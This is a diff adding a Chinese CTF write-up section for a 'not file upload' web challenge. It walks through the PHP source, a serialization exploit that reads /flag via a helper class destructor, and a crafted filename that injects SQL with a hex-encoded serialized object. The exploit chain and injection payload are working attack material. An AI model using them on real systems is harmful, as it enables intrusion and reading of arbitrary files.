@@ -349,3 +349,193 @@ parse_url用``///``绕过
 ### 参考资料
 
 https://www.anquanke.com/post/id/187393
+
+
+## 不是文件上传（赛后复现）
+
+页脚提示项目名 在Github上找到源码
+
+既然不是文件上传，那么大概率是在文件名种注入sql或者反序列化等操作
+
+看一下源代码，有serialize和unserialize操作
+
+```php
+	public function upload($input="file")
+	{
+		$fileinfo = $this->getfile($input);
+		$array = array();
+		$array["title"] = $fileinfo['title'];
+		$array["filename"] = $fileinfo['filename'];
+		$array["ext"] = $fileinfo['ext'];
+		$array["path"] = $fileinfo['path'];
+		$img_ext = getimagesize($_FILES[$input]["tmp_name"]);
+		$my_ext = array("width"=>$img_ext[0],"height"=>$img_ext[1]);
+		$array["attr"] = serialize($my_ext);//序列化点
+		$id = $this->save($array);
+		if ($id == 0){
+			die("Something wrong!");
+		}
+		echo "<br>";
+		echo "<p>Your images is uploaded successfully. And your image's id is $id.</p>";
+	}
+```
+
+```php
+	public function Get_All_Images(){
+		$sql = "SELECT * FROM images";
+		$result = mysqli_query($this->con, $sql);
+		if ($result->num_rows > 0){
+		    while($row = $result->fetch_assoc()){
+		    	if($row["attr"]){
+		    		$attr_temp = str_replace('\0\0\0', chr(0).'*'.chr(0), $row["attr"]);
+					$attr = unserialize($attr_temp);//反序列化点
+				}
+		        echo "<p>id=".$row["id"]." filename=".$row["filename"]." path=".$row["path"]."</p>";
+		    }
+		}else{
+		    echo "<p>You have not uploaded an image yet.</p>";
+		}
+		mysqli_close($this->con);
+	}
+```
+
+反序列化利用链也很显然
+
+利用show的
+```php
+class helper {
+	protected $folder = "pic/";
+	protected $ifview = False; 
+	protected $config = "config.txt";
+
+	public function view_files($path){
+		if ($this->ifview == False){
+			return False;
+			//The function is not yet perfect, it is not open yet.
+		}
+		$content = file_get_contents($path);
+		echo $content;
+    }
+    
+	function __destruct(){
+		# Read some config html
+		$this->view_files($this->config);//任意文件读
+	}
+```
+
+先写个反序列化的Exp
+
+
+```php
+<?php
+class helper {
+	protected $folder = "pic/";
+	protected $ifview = True; 
+	protected $config = "/flag";
+
+	public function view_files($path){
+		if ($this->ifview == False){
+			return False;
+			//The function is not yet perfect, it is not open yet.
+		}
+		$content = file_get_contents($path);
+		echo $content;
+	}
+
+	function __destruct(){
+		# Read some config html
+		$this->view_files($this->config);
+	}
+}
+
+$helper = new Helper();
+echo str_replace(chr(0).'*'.chr(0),'\0\0\0',serialize($helper));
+?>
+```
+
+有个要注意的点是根据源码要对生成的payload进行修改
+
+然后怎么把反序列化数据注入呢，这里利用sql进行注入
+
+```php
+	public function check($info)
+	{
+		$basename = substr(md5(time().uniqid()),9,16);
+		$filename = $info["name"];
+		$ext = substr(strrchr($filename, '.'), 1);
+		$cate_exts = array("jpg","gif","png","jpeg");
+		if(!in_array($ext,$cate_exts)){
+			die("<p>Please upload the correct image file!!!</p>");
+		}
+	    $title = str_replace(".".$ext,'',$filename);
+	    return array('title'=>$title,'filename'=>$basename.".".$ext,'ext'=>$ext,'path'=>$this->folder.$basename.".".$ext);//此处title可控
+	}
+	public function upload($input="file")
+	{
+		$fileinfo = $this->getfile($input);
+		$array = array();
+		$array["title"] = $fileinfo['title'];
+		$array["filename"] = $fileinfo['filename'];
+		$array["ext"] = $fileinfo['ext'];
+		$array["path"] = $fileinfo['path'];
+		$img_ext = getimagesize($_FILES[$input]["tmp_name"]);
+		$my_ext = array("width"=>$img_ext[0],"height"=>$img_ext[1]);
+		$array["attr"] = serialize($my_ext);//my_ext
+		$id = $this->save($array);
+		if ($id == 0){
+			die("Something wrong!");
+		}
+		echo "<br>";
+		echo "<p>Your images is uploaded successfully. And your image's id is $id.</p>";
+    }
+    public function save($data)
+	{
+		if(!$data || !is_array($data)){
+			die("Something wrong!");
+		}
+		$id = $this->insert_array($data);
+		return $id;
+	}
+	public function insert_array($data)
+	{	
+		$con = mysqli_connect("127.0.0.1","root","root","pic_base");
+		if (mysqli_connect_errno($con)) 
+		{ 
+		    die("Connect MySQL Fail:".mysqli_connect_error());
+		}
+		$sql_fields = array();
+		$sql_val = array();
+		foreach($data as $key=>$value){
+			$key_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $key);
+			$value_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $value);
+			$sql_fields[] = "`".$key_temp."`";
+			$sql_val[] = "'".$value_temp."'";
+		}
+		$sql = "INSERT INTO images (".(implode(",",$sql_fields)).") VALUES(".(implode(",",$sql_val)).")";
+		mysqli_query($con, $sql);
+		$id = mysqli_insert_id($con);
+		mysqli_close($con);
+		return $id;
+	}
+```
+
+上传语句为
+
+```sql
+INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES('test','9f09bc3fd029a211.gif','gif','pic/9f09bc3fd029a211.gif','a:2:{s:5:"width";i:256;s:6:"height";i:256;}')
+```
+构造文件名为
+
+```
+1','1','1','1',0x4f3a363a2268656c706572223a333a7b733a393a225c305c305c30666f6c646572223b733a343a227069632f223b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),('1.jpg
+```
+利用hex绕过字符串单引号限制
+
+效果
+```sql
+INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES('1','1','1','1',0x4f3a363a2268656c706572223a333a7b733a393a225c305c305c30666f6c646572223b733a343a227069632f223b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),('1.jpg','9f09bc3fd029a211.gif','gif','pic/9f09bc3fd029a211.gif','a:2:{s:5:"width";i:256;s:6:"height";i:256;}')
+
+```
+
+
+
